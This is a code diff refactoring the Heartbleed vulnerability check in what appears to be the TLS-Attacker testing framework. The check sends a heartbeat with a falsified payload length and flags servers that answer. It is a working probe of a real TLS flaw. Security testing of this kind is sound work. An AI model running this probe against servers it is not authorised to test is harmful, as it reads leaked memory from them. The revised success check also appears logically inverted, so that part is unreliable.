@@ -15,15 +15,14 @@ import de.rub.nds.modifiablevariable.integer.ModifiableInteger;
 import de.rub.nds.modifiablevariable.singlebyte.ModifiableByte;
 import de.rub.nds.tlsattacker.attacks.config.HeartbleedCommandConfig;
 import de.rub.nds.tlsattacker.core.config.Config;
-import de.rub.nds.tlsattacker.core.constants.HandshakeMessageType;
 import de.rub.nds.tlsattacker.core.constants.ProtocolMessageType;
 import de.rub.nds.tlsattacker.core.exceptions.WorkflowExecutionException;
 import de.rub.nds.tlsattacker.core.protocol.message.HeartbeatMessage;
-import de.rub.nds.tlsattacker.core.protocol.message.ProtocolMessage;
 import de.rub.nds.tlsattacker.core.state.TlsContext;
 import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutor;
 import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutorFactory;
 import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
+import de.rub.nds.tlsattacker.core.workflow.WorkflowTraceUtil;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 
@@ -50,8 +49,8 @@ public class HeartbleedAttacker extends Attacker<HeartbleedCommandConfig> {
     public Boolean isVulnerable() {
         Config tlsConfig = config.createConfig();
         TlsContext tlsContext = new TlsContext(tlsConfig);
-        WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(tlsConfig.getExecutorType(),
-                tlsContext);
+        WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(
+                tlsConfig.getWorkflowExecutorType(), tlsContext);
 
         WorkflowTrace trace = tlsContext.getWorkflowTrace();
 
@@ -60,8 +59,8 @@ public class HeartbleedAttacker extends Attacker<HeartbleedCommandConfig> {
         payloadLength.setModification(IntegerModificationFactory.explicitValue(config.getPayloadLength()));
         ModifiableByteArray payload = new ModifiableByteArray();
         payload.setModification(ByteArrayModificationFactory.explicitValue(new byte[] { 1, 3 }));
-        HeartbeatMessage hb = (HeartbeatMessage) trace
-                .getFirstConfiguredSendMessageOfType(ProtocolMessageType.HEARTBEAT);
+        HeartbeatMessage hb = (HeartbeatMessage) WorkflowTraceUtil.getFirstSendMessage(ProtocolMessageType.HEARTBEAT,
+                trace);
         hb.setHeartbeatMessageType(heartbeatMessageType);
         hb.setPayload(payload);
         hb.setPayloadLength(payloadLength);
@@ -73,13 +72,11 @@ public class HeartbleedAttacker extends Attacker<HeartbleedCommandConfig> {
             LOGGER.debug(ex);
         }
 
-        if (trace.getActuallyRecievedHandshakeMessagesOfType(HandshakeMessageType.FINISHED).isEmpty()) {
-            LOGGER.info("Correct TLS handshake cannot be executed, no Server Finished message found. Check the server configuration.");
+        if (trace.executedAsPlanned()) {
+            LOGGER.info("Could not execute Workflow correctly. Check the Debug log");
             return null;
         } else {
-            ProtocolMessage lastMessage = trace.getAllActuallyReceivedMessages().get(
-                    trace.getAllActuallyReceivedMessages().size() - 1);
-            if (lastMessage.getProtocolMessageType() == ProtocolMessageType.HEARTBEAT) {
+            if (WorkflowTraceUtil.didReceiveMessage(ProtocolMessageType.HEARTBEAT, trace)) {
                 LOGGER.info("Vulnerable. The server responds with a heartbeat message, although the client heartbeat message contains an invalid Length value");
                 return true;
             } else {
